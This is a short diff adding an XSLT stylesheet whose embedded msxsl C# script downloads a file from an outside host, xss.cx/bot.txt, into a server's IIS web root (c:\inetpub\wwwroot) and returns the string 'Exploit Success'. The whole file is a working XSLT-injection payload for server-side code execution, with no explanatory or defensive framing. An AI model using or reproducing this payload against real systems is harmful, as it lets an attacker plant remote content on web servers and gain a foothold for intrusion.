@@ -1,0 +1,21 @@
+<?xml version='1.0'?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+<msxsl:script language="C#" implements-prefix="user">
+<![CDATA[
+public string xml()
+{
+    System.Net.WebClient webClient = new System.Net.WebClient();
+    webClient.DownloadFile("https://xss.cx/bot.txt",
+                       @"c:\inetpub\wwwroot\bot.txt");
+
+    return "Exploit Success";
+}
+]]>
+</msxsl:script>
+<xsl:template match="/">
+<xsl:value-of select="user:xml()"/>
+</xsl:template>
+</xsl:stylesheet>
